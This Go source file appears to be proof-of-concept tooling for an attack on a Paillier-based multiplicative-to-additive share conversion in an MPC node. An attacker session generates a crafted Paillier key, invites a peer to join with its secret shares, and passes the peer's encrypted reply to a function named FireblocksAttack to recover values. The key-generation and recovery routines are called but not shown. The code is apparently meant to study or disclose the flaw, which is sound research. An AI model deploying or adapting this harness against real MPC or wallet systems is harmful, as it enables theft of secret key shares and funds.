package main

import (
	"encoding/json"
	"fmt"
	"math/big"

	"github.com/google/uuid"
	"github.com/manifoldco/promptui"
)

type PM2AttMessage struct {
	N *big.Int
	V *big.Int //Encrypted value
}

type PM2AttState struct {
	Role     string
	Priv     *PaillierPriv
	Pub      *PaillierPub
	MulShare *big.Int
	AddShare *big.Int
	V        *big.Int
	V1       *big.Int
	Ps       []*big.Int
	Qs       []*big.Int
	rs       []*big.Int
	xs       []*big.Int
	x        *big.Int
}

func NewPM2AttState() *PM2AttState {
	st := new(PM2AttState)
	st.MulShare = new(big.Int)
	st.AddShare = new(big.Int)
	return st
}

func PrintPM2AttState(ses *Session) {
	fmt.Println("Printing state...")
	st := (ses.State).(*PM2AttState)
	fmt.Println("Role:", st.Role)
	fmt.Println("Multiplicative secret:", st.MulShare)
	fmt.Println("Additive secret:", st.AddShare) //TODO an array of counterparties
	fmt.Println("Private key:", st.Priv != nil)
	n := big.NewInt(0)
	if st.Pub != nil {
		n = st.Pub.N
	}
	fmt.Println("N:", n)
	fmt.Println("V:", st.V)
	fmt.Println("V1:", st.V1)
	fmt.Println("Ps:", st.Ps)
	fmt.Println("Qs:", st.Qs)
  	fmt.Println("rs:", st.rs)
	fmt.Println("xs:", st.xs)
	fmt.Println("x:", st.x)
}

func InitNewPM2Att(mpcn *MPCNode) {
	var err error
	sid := "PM2Att-" + uuid.NewString()
	ses := NewSenderPM2AttSession(mpcn, sid)
	st := (ses.State).(*PM2AttState)

	st.MulShare = PromptForNumber("Attack value:", "4")

	b := PromptForNumber("Bits for primes:", "256")
	bits := int(b.Int64())
	st.Priv, st.Pub, st.Ps, st.Qs = GenerateAttackKey(bits)

	mpcm := new(MPCMessage)
	mpcm.Command = "join"
	msg := &PM2AttMessage{}
	msg.N = st.Priv.N
	msg.V = st.MulShare
	st.V = msg.V
	mpcm.Message, err = json.Marshal(msg)
	if err != nil {
		fmt.Println(err)
	}

	mpcm.Protocol = PM2Att
	mpcn.Respond(mpcm, ses)
	ses.Interactive = false

}

func NewRecPM2AttSession(mpcn *MPCNode, sessionID string) *Session {
	ses := NewSenderPM2AttSession(mpcn, sessionID)
	st := (ses.State).(*PM2AttState)
	st.Role = "receiver"
	return ses
}

func NewSenderPM2AttSession(mpcn *MPCNode, sessionID string) *Session {

	ses := new(Session)
	ses.ID = sessionID
	ses.Type = PM2Att
	ses.HandleMessage = HandlePM2AttMessage
	ses.Details = PrintPM2AttState
	ses.Interactive = true
	st := NewPM2AttState()
	st.Role = "sender"
	ses.State = st
	ses.Status = "awaiting peer"
	ses.ID = sessionID
	mpcn.sessions[ses.ID] = ses
	ses.Node = mpcn
	return ses

}

func HandlePM2AttMessage(mpcm *MPCMessage, ses *Session) {
	//st := (ses.State).(*PM2AttState)
	switch mpcm.Command {
	case "join":
		ses.Interactive = true
		ses.NextPrompt = PM2AttPromptJoin

		msg := new(PM2AttMessage)
		err := json.Unmarshal(mpcm.Message, msg)
		if err != nil {
			fmt.Println(err)
		}
		st := (ses.State).(*PM2AttState)
		st.Pub = &PaillierPub{msg.N, new(big.Int).Mul(msg.N, msg.N)}
		st.V = msg.V

	case "save":
		ses.Interactive = false
		st := (ses.State).(*PM2AttState)
		msg := new(PM2AttMessage)
		err := json.Unmarshal(mpcm.Message, msg)
		if err != nil {
			fmt.Println(err)
		}
		st.V1 = msg.V
		st.rs, st.xs, st.x = FireblocksAttack(st.V, msg.V, st.Ps, st.Qs)
		fmt.Println(msg.N.Cmp(st.AddShare))

	default:
		fmt.Println("we shouldnt be here...")

	}

}

func PM2AttPromptJoin(mpcn *MPCNode, ses *Session) {
	//ots := ses.State.(*OT1State)
	items := []string{"Yes", "No", up}
	pr := promptui.Select{Label: "Accept PM2A invitation",
		Items: items,
	}
	_, res, _ := pr.Run()
	switch res {
	case up:
		return
	case "No":
		delete(mpcn.sessions, ses.ID)
	case "Yes":

		v := PromptForNumber("Local multiplicative share", "")

		st := (ses.State).(*PM2AttState)
		st.MulShare = v

		bf := PromptForNumber("Local aditive share", "")
		st.AddShare = bf //TODO randomize
		E := st.Pub.Encrypt(new(big.Int).Neg(st.AddShare))
		V1 := new(big.Int).Exp(st.V, st.MulShare, st.Pub.N2)
		V1.Mul(V1, E)
		V1.Mod(V1, st.Pub.N2)
		st.V1 = V1

		msg := new(PM2AttMessage)
		msg.N = st.Pub.N
		msg.V = V1
		b, err := json.Marshal(msg)
		if err != nil {
			fmt.Println(err)
		}

		mpcm := new(MPCMessage)
		mpcm.Message = b
		mpcm.Command = "save"

		mpcn.Respond(mpcm, ses)
		ses.Interactive = false
		ses.Status = "joined"
	}
}
